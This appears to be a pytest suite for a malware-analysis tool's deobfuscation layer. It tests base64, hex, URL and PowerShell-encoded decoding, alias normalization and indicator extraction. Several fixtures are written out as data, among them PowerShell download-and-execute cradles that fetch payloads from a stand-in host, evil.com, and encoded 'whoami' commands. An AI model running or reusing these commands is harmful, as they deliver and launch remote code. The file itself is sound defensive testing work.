"""
Unit tests for the Universal Deobfuscation & Normalization Layer.
Run: python -m pytest tests/test_deobfuscator.py -v
"""

import base64
import gzip
import sys
import os
import pytest

# Ensure the backend app is importable
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app.analysis.deobfuscation import (
    EncodingDetector,
    RecursiveDecoder,
    ContentNormalizer,
    UniversalDeobfuscator,
    recover_iocs_from_text,
)


# ════════════════════════════════════════════════════════════════════════════
# Phase 1 — EncodingDetector Tests
# ════════════════════════════════════════════════════════════════════════════

class TestEncodingDetector:

    def test_detects_powershell_enc(self):
        # Real PowerShell encoded command (UTF-16LE base64 of "whoami")
        payload = base64.b64encode("whoami".encode("utf-16-le")).decode()
        cmd = f"powershell.exe -enc {payload}"
        detections = EncodingDetector.detect(cmd)
        types = [d.encoding_type for d in detections]
        assert "powershell_enc" in types

    def test_detects_base64_blob(self):
        blob = base64.b64encode(b"This is a hidden malicious command that should be detected").decode()
        detections = EncodingDetector.detect(blob)
        types = [d.encoding_type for d in detections]
        assert "base64" in types

    def test_detects_url_encoding(self):
        encoded = "http%3A%2F%2Fevil.com%2Fmalware%2Fdownload%3Fparam%3Dvalue"
        detections = EncodingDetector.detect(encoded)
        types = [d.encoding_type for d in detections]
        assert "url_encoding" in types

    def test_detects_hex_encoding(self):
        hex_str = "687474703a2f2f6576696c2e636f6d2f6d616c77617265"  # http://evil.com/malware
        detections = EncodingDetector.detect(hex_str)
        types = [d.encoding_type for d in detections]
        assert "hex" in types

    def test_detects_eval_base64(self):
        code = 'eval(base64.b64decode("aW1wb3J0IG9z"))'
        detections = EncodingDetector.detect(code)
        types = [d.encoding_type for d in detections]
        assert "eval_base64" in types

    def test_detects_string_concat(self):
        concat = '"c"+"m"+"d"+" "+"/c"+" "+"whoami"'
        detections = EncodingDetector.detect(concat)
        types = [d.encoding_type for d in detections]
        assert "string_concat" in types

    def test_detects_unicode_escape(self):
        escaped = r"\x63\x6d\x64\x2e\x65\x78\x65"
        detections = EncodingDetector.detect(escaped)
        types = [d.encoding_type for d in detections]
        assert "unicode_escape" in types

    def test_entropy_calculation(self):
        low_entropy = "aaaaaaaaaa"
        high_entropy = "aB3$xZ9!kLm@"
        assert EncodingDetector.shannon_entropy(low_entropy) < EncodingDetector.shannon_entropy(high_entropy)

    def test_empty_string(self):
        assert EncodingDetector.detect("") == []
        assert EncodingDetector.detect("abc") == []  # too short


# ════════════════════════════════════════════════════════════════════════════
# Phase 2 — RecursiveDecoder Tests
# ════════════════════════════════════════════════════════════════════════════

class TestRecursiveDecoder:

    def setup_method(self):
        self.decoder = RecursiveDecoder()

    def test_single_base64(self):
        original = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
        blob = base64.b64encode(original.encode()).decode()
        result = self.decoder.decode(blob)
        assert original in result.decoded
        assert len(result.layers) >= 1
        assert result.layers[0].encoding_type == "base64"

    def test_powershell_enc_utf16(self):
        hidden_cmd = "whoami /all"
        b64 = base64.b64encode(hidden_cmd.encode("utf-16-le")).decode()
        full_cmd = f"powershell.exe -EncodedCommand {b64}"
        result = self.decoder.decode(full_cmd)
        assert "whoami /all" in result.decoded
        assert result.layers[0].encoding_type == "powershell_enc"

    def test_hex_decode(self):
        original = "http://evil.com/malware"
        hex_str = original.encode().hex()
        result = self.decoder.decode(hex_str)
        assert "evil.com" in result.decoded

    def test_nested_hex_then_base64(self):
        """Hex → Base64 nesting: hex-encode a base64 blob."""
        inner = "Invoke-Expression whoami"
        b64 = base64.b64encode(inner.encode()).decode()
        hex_of_b64 = b64.encode().hex()
        result = self.decoder.decode(hex_of_b64)
        assert len(result.layers) >= 2
        assert "whoami" in result.decoded

    def test_url_decode(self):
        encoded = "http%3A%2F%2Fevil.com%2Fmalware%2Fdownload%3Fparam%3Dvalue"
        result = self.decoder.decode(encoded)
        assert "http://evil.com/malware/download" in result.decoded

    def test_eval_base64_wrapper(self):
        hidden = "import os; os.system('whoami')"
        b64 = base64.b64encode(hidden.encode()).decode()
        code = f'eval(base64.b64decode("{b64}"))'
        result = self.decoder.decode(code)
        assert "whoami" in result.decoded

    def test_max_depth_protection(self):
        """Ensure decoder stops at max depth."""
        decoder = RecursiveDecoder(max_depth=2)
        # Create a 3-layer nesting that should be truncated at 2
        inner = "final_payload"
        for _ in range(3):
            inner = base64.b64encode(inner.encode()).decode()
        result = decoder.decode(inner)
        # Should have at most 2 layers
        assert len(result.layers) <= 2

    def test_loop_protection(self):
        """Ensure decoder handles content that decodes back to itself."""
        # This won't actually loop because base64 changes, but test the hash check
        result = self.decoder.decode("not_really_encoded_content_at_all")
        assert result.decoded == "not_really_encoded_content_at_all"
        assert not result.was_obfuscated


# ════════════════════════════════════════════════════════════════════════════
# Phase 3 — ContentNormalizer Tests
# ════════════════════════════════════════════════════════════════════════════

class TestContentNormalizer:

    def test_powershell_alias_iex(self):
        result = ContentNormalizer.normalize("iex(new-object net.webclient)")
        assert "Invoke-Expression" in result
        assert "New-Object" in result

    def test_powershell_alias_iwr(self):
        result = ContentNormalizer.normalize("iwr http://evil.com -outfile payload.exe")
        assert "Invoke-WebRequest" in result

    def test_env_var_temp(self):
        result = ContentNormalizer.normalize("copy payload.exe %TEMP%\\malware.exe")
        assert "TEMP_PATH" in result

    def test_env_var_appdata(self):
        result = ContentNormalizer.normalize("$env:APPDATA\\payload.exe")
        assert "APPDATA_PATH" in result

    def test_cmd_c_normalization(self):
        result = ContentNormalizer.normalize("cmd /c whoami")
        assert "CMD_EXECUTION" in result

    def test_rundll32_normalization(self):
        result = ContentNormalizer.normalize("rundll32.exe javascript:\"\\..\"")
        assert "RUNDLL32_EXEC" in result

    def test_mixed_case(self):
        result = ContentNormalizer.normalize("  InVoKe-ExPrEsSiOn   ")
        assert "Invoke-Expression" in result

    def test_whitespace_collapse(self):
        result = ContentNormalizer.normalize("cmd    /c     whoami")
        assert "  " not in result


# ════════════════════════════════════════════════════════════════════════════
# Phase 4 — IOC Recovery Tests
# ════════════════════════════════════════════════════════════════════════════

class TestIOCRecovery:

    def test_recover_ip(self):
        iocs = recover_iocs_from_text("connecting to 192.168.1.100 on port 443")
        types = [i["type"] for i in iocs]
        assert "ip" in types

    def test_recover_url(self):
        iocs = recover_iocs_from_text("download from https://evil.com/payload.exe")
        types = [i["type"] for i in iocs]
        assert "url" in types

    def test_recover_email(self):
        iocs = recover_iocs_from_text("send to attacker@evil.com")
        types = [i["type"] for i in iocs]
        assert "email" in types

    def test_recover_registry_key(self):
        iocs = recover_iocs_from_text("writing to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        types = [i["type"] for i in iocs]
        assert "registry" in types

    def test_recover_filepath(self):
        iocs = recover_iocs_from_text("dropped to C:\\Users\\victim\\AppData\\Local\\Temp\\malware.exe")
        types = [i["type"] for i in iocs]
        assert "filepath" in types

    def test_recover_named_pipe(self):
        iocs = recover_iocs_from_text("connected to \\\\.\\pipe\\msagent_12")
        types = [i["type"] for i in iocs]
        assert "pipe" in types

    def test_source_layer_tagging(self):
        iocs = recover_iocs_from_text("https://evil.com/c2", source_layer="Decoded Payload")
        assert iocs[0]["source_layer"] == "Decoded Payload"
        assert iocs[0]["confidence"] == "High"


# ════════════════════════════════════════════════════════════════════════════
# Phase 7 — UniversalDeobfuscator Orchestrator Tests
# ════════════════════════════════════════════════════════════════════════════

class TestUniversalDeobfuscator:

    def setup_method(self):
        self.deob = UniversalDeobfuscator()

    def test_full_pipeline_powershell_enc(self):
        """End-to-end: PS encoded command → decoded → normalized."""
        hidden = "Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\temp\\malware.exe"
        b64 = base64.b64encode(hidden.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -enc {b64}"

        result = self.deob.deobfuscate_string(cmd)
        assert result.was_obfuscated
        assert "evil.com" in result.decoded
        assert "Invoke-WebRequest" in result.normalized
        assert len(result.layers) >= 1

    def test_telemetry_processing(self):
        """Process a mock telemetry event list."""
        hidden = "whoami /all"
        b64 = base64.b64encode(hidden.encode("utf-16-le")).decode()

        events = [
            {
                "type": "PROCESS_CREATE",
                "data": {
                    "cmdline": f"powershell.exe -enc {b64}",
                    "pid": 1234,
                }
            },
            {
                "type": "DNS_QUERY",
                "data": {"query": "example.com"}
            },
        ]

        report = self.deob.process_telemetry(events)
        assert report["total_fields_decoded"] >= 1

        # Verify the event was mutated with decoded fields
        assert "decoded_cmdline" in events[0]["data"]
        assert "whoami" in events[0]["data"]["decoded_cmdline"]

    def test_benign_passthrough(self):
        """Benign content should not be flagged as obfuscated."""
        result = self.deob.deobfuscate_string("print('hello world')")
        assert not result.was_obfuscated
        assert result.decoded == "print('hello world')"

    def test_empty_input(self):
        result = self.deob.deobfuscate_string("")
        assert not result.was_obfuscated

    def test_static_string_processing(self):
        """Process static analysis strings."""
        hidden = "http://evil.com/payload"
        b64 = base64.b64encode(hidden.encode()).decode()

        static_results = {
            "strings": {
                "interesting": [f"eval(base64.b64decode('{b64}'))"],
                "ips": [],
                "urls": [],
                "domains": [],
            }
        }

        report = self.deob.process_static_strings(static_results)
        assert report["total_decoded"] >= 1
        assert "decoded" in static_results["strings"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
